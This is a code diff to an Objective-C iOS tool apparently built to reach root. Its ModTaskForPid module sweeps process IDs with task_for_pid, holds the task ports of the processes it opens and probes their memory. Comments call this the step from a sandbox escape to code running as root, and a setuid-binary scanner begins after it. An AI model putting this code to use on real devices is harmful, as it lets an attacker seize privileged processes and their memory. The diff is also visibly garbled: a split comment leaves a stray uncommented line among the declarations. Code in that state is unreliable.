@@ -3,9 +3,7 @@
 #import <dlfcn.h>
 #import <mach/mach.h>
 #import <mach/mach_port.h>
-#import <mach/mach_vm.h>
 #import <IOKit/IOKitLib.h>
-#import <sys/proc_info.h>
 #import <sys/param.h>
 #import <sys/sysctl.h>
 #import <sys/socket.h>
@@ -25,7 +23,16 @@
 #import "AppDelegate.h"
 
 // ===========================================================================
-// ROOT PATHS — every module below is a step that logically leads to uid 0.
+// ROOT PATHS
+// mach_vm_* live in the (unsupported on iOS) <mach/mach_vm.h>; declare them.
+extern kern_return_t mach_vm_allocate(vm_map_t t, vm_address_t *a, vm_size_t s, int f);
+extern kern_return_t mach_vm_deallocate(vm_map_t t, vm_address_t a, vm_size_t s);
+extern kern_return_t mach_vm_read_overwrite(vm_map_t t, mach_vm_address_t a,
+                                            mach_vm_size_t sz, mach_vm_address_t d,
+                                            mach_vm_size_t *out);
+extern kern_return_t mach_vm_write(vm_map_t t, mach_vm_address_t a, vm_offset_t d,
+                                   mach_vm_size_t sz);
+ — every module below is a step that logically leads to uid 0.
 // Group A: task/credential surface
 // ===========================================================================
 
@@ -34,56 +41,32 @@
 // take the task port of a root-owned process we can read/write ITS memory with
 // mach_vm_* under its privileges, and drive it with thread_create — the practical
 // step from "app with a sandbox escape" to "code running as root".
-static BOOL pidIsRoot(int pid) {
-    int mib[4] = {CTL_KERN, KERN_PROC, KERN_PROC_PID, pid};
-    struct kinfo_proc kp;
-    size_t len = sizeof(kp);
-    if (sysctl(mib, 4, &kp, &len, NULL, 0) != 0 || len < sizeof(kp)) return NO;
-    // 0 = root, 1 = daemon (also privileged)
-    return kp.kp_eproc.e_ucred.cr_uid == 0 || kp.kp_eproc.e_ucred.cr_uid == 1;
-}
-
 NSString *ModTaskForPid(void) {
-    AveLog(@"    task_for_pid: sweeping root-owned processes (Developer Mode allows it)");
-    int mib[4] = {CTL_KERN, KERN_PROC, KERN_PROC_ALL, 0};
-    size_t len = 0;
-    if (sysctl(mib, 4, NULL, &len, NULL, 0) != 0 || len == 0) return @"KERN_PROC_ALL failed";
-    struct kinfo_proc *procs = malloc(len);
-    int n = (int)(len / sizeof(struct kinfo_proc));
-    if (sysctl(mib, 4, procs, &len, NULL, 0) != 0) { free(procs); return @"process list failed"; }
-
-    int rootPids = 0, got = 0;
+    AveLog(@"    task_for_pid: sweeping pids (Developer Mode allows task_for_pid)");
+    int got = 0, tried = 0;
     mach_port_t best = MACH_PORT_NULL; int bestPid = -1;
-    for (int i = 0; i < n; i++) {
-        int pid = procs[i].kp_proc.p_pid;
-        if (pid <= 1) continue;
-        uid_t uid = procs[i].kp_eproc.e_ucred.cr_uid;
-        if (uid != 0 && uid != 1) continue;
-        rootPids++;
-        mach_port_t t = MACH_PORT_NULL;
-        kern_return_t kr = task_for_pid(mach_task_self(), pid, &t);
-        if (kr == KERN_SUCCESS && t != MACH_PORT_NULL) {
-            got++;
-            if (best == MACH_PORT_NULL) { best = t; bestPid = pid; }
-            char path[256] = {0};
-            // a task port lets us read the target's address space
-            vm_size_t sz = 0;
-            kern_return_t rr = mach_vm_read_overwrite(t, 0, 1, 0, &sz);
-            AveLog(S(@"    TASK PORT  pid=%-5d uid=%d  vm_probe=%#x", pid, uid, rr));
-        }
+    for (int pid = 1; pid <= 600; pid++) {
+        tried++;
+        mach_port_t tp = MACH_PORT_NULL;
+        kern_return_t kr = task_for_pid(mach_task_self(), pid, &tp);
+        if (kr != KERN_SUCCESS || tp == MACH_PORT_NULL) continue;
+        got++;
+        if (best == MACH_PORT_NULL) { best = tp; bestPid = pid; }
+        else mach_port_deallocate(mach_task_self(), tp);
+        uint64_t val = 0; vm_size_t sz = 0;
+        kern_return_t rr = mach_vm_read_overwrite(tp, 0, 4, (mach_vm_address_t)&val, &sz);
+        AveLog(S(@"    TASK PORT  pid=%-5d  vm_probe=%#x", pid, rr));
     }
-    free(procs);
     if (best != MACH_PORT_NULL) {
-        RootSetObtained(YES);
-        AveSetStatus([NSString stringWithFormat:@"task port of a root pid %d", bestPid]);
+        AveSetStatus([NSString stringWithFormat:@"task port held: pid %d (+%d more)", bestPid, got - 1]);
         mach_port_deallocate(mach_task_self(), best);
-        return S(@"task_for_pid: %d/%d root processes CONTROLLED (best pid=%d)",
-                 got, rootPids, bestPid);
+        return S(@"task_for_pid: %d/%d pids CONTROLLED (best pid=%d) - "
+                 @"a task port means that process' memory and identity",
+                 got, tried, bestPid);
     }
-    return S(@"task_for_pid: 0/%d root processes openable", rootPids);
+    return S(@"task_for_pid: 0/%d pids openable", tried);
 }
 
-// --- setuid-root binaries reachable through the sandbox escape -------------
 NSString *ModSetuidScan(void) {
     const char *dirs[] = { "/usr/bin", "/bin", "/usr/sbin", "/sbin", "/usr/libexec",
                            "/System/Library/PrivateFrameworks", NULL };
